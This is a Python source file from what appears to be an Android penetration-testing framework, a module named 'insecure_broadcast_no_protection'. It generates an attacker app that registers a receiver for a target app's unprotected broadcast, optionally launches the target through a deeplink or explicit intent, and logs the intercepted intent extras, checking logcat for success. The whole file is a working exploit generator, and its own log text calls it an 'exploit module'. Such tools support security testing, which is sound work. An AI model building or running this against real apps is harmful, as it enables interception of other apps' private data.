from modules.android.app.app import App
from modules.android.app.template import Template
from settings.logger import get_logger
from state.opt_bool import OptBool
from state.opt_list import OptList
from state.opt_str import OptStr
from state.options import option_state


log = get_logger(__name__)


class SherlockModule(App):

    def __init__(self):
        super().__init__()
        self._id = "insecure_broadcast_no_protection"
        self._template = Template()


    def register_options(self):
        option_state.add_options([
            OptBool("IS_EXPORTED", [True, "Whether the target class is exported (Default: True)", True]),
            OptBool("VIA_DEEPLINK", [True, "Communicate to target via deeplink (Default: False)", False]),
            OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
            OptStr("PERMISSION", [True, "Broadcast permission"]),
            OptStr("TARGET_PACKAGE", [True, "Target package name"]),
            OptStr("TARGET_CLASS", [True, "Target class name"]),
            OptList("INTENT_EXTRA", [False, "Intent extra data"]),
            OptStr("INTENT_ACTION", [True, "Intent action to intercept"]),
            OptList("BROADCAST_EXTRA", [True, "Target broadcast intent extra data"])
        ])
        self.update_option_status()


    def update_option_status(self):
        opts = option_state.get_all_options()
        stat_dict = {
            "via_deeplink": {
                "pos": ["deeplink_uri"],
                "neg": ["target_class"]
            },
            "is_exported": {
                "pos": ["via_deeplink"],
                "neg": []
            },
        }
        super().update_option_status(stat_dict, opts)


    def execute(self):
        opts = self.get_options_value()

        receiver_var = "receiver"
        req_permission_var = "requestPermission"

        register_receiver=[
            self._template.register_receiver(intent_filter=opts['INTENT_ACTION']),
            self._template.build_intent(
                set_action="android.intent.action.VIEW" if opts['VIA_DEEPLINK'] else None,
                set_data=f"\"{opts['DEEPLINK_URI']}\"" if opts['VIA_DEEPLINK'] else None,
                set_classname=[opts['TARGET_PACKAGE'], opts['TARGET_CLASS']] if not opts['VIA_DEEPLINK'] else [],
                put_extra=[[extra[0], f"\"{extra[1]}\""] for extra in opts['INTENT_EXTRA']] if opts['INTENT_EXTRA'] != "" else [],
            )
        ]

        if not opts['IS_EXPORTED']:
            register_receiver.pop()

        component = self._template.build_activity(
            name=self.activity_name(self._id, opts['TARGET_PACKAGE']),
            libs=[
                "android.content.BroadcastReceiver",
                "android.content.Context",
                "android.content.Intent",
                "android.content.IntentFilter",
                "android.content.pm.PackageManager",
                "android.os.Bundle",
                "android.util.Log",
                "androidx.activity.result.ActivityResultLauncher",
                "androidx.activity.result.contract.ActivityResultContracts",
                "androidx.appcompat.app.AppCompatActivity",
                "androidx.core.app.ActivityCompat"
            ],
            bind_button=True,
            on_create=[
                self._template.request_permission(
                    permission=opts['PERMISSION'],
                    granted_content=register_receiver,
                    ungranted_content=[
                        f"{req_permission_var}.launch(\"{opts['PERMISSION']}\");"
                    ]
                )
            ],
            on_destroy=[
                f"unregisterReceiver({receiver_var});"
            ],
            listener=[
                self._template.build_dynamic_receiver(
                    on_receive=[
                        "StringBuilder sb = new StringBuilder();",
                        ''.join([f"String data{i} = intent.getStringExtra(\"{extra[0]}\");\nsb.append(data{i}).append(\";\");\n" for i, extra in enumerate(opts['BROADCAST_EXTRA'])]),
                        "Log.i(\"ELEMENTARY!!!\", \"Data:\" + sb);"
                    ]
                ),
                self._template.build_request_permission_launcher(
                    launcher=req_permission_var,
                    process_result=register_receiver
                )
            ]
        )

        app = {
            "manifest": [
                self._template.build_manifest_component(self.activity_name(self._id, opts['TARGET_PACKAGE']))
            ],
            "layout": self._template.button_layout(self._id, opts['TARGET_PACKAGE']),
            "bind_button": self._template.bind_button(self._id, opts['TARGET_PACKAGE']),
            "component": [
                {
                    "name": f"{self.activity_name(self._id, opts['TARGET_PACKAGE'])}.java",
                    "content": component 
                }
            ],
            "permission": self._template.permission_manifest(opts['PERMISSION'])
        }

        stat = {
            "failed": [
                {
                    "regex": r"^.*java\.lang\.SecurityException:.*$",
                    "msg": r"java\.lang\.SecurityException:.*"
                },
                {
                    "regex": r"^.*java\.lang\.NullPointerException:.*$",
                    "msg": r"java\.lang\.NullPointerException:.*"
                },
                {
                    "regex": r"^.*java\.lang\.RuntimeException:.*$",
                    "msg": r"java\.lang\.RuntimeException:.*"
                }
            ],
            "succeed": {
                "regex": r"^.*ELEMENTARY!!!.*$",
                "data": r"Data:.*"
            }
        }

        build_app = self.build(app)
        if not build_app:
            log.error("Module failed to execute, terminating module..\n")
            return
        
        if opts['IS_EXPORTED']:
            log.warning("Press the button displayed to execute the exploit module.")
        else:
            log.warning(f"Navigate to target class: \"{opts['TARGET_CLASS']}\" and trigger the broadcast.")

        self.check_logcat(stat)


# DONE
# RETESTED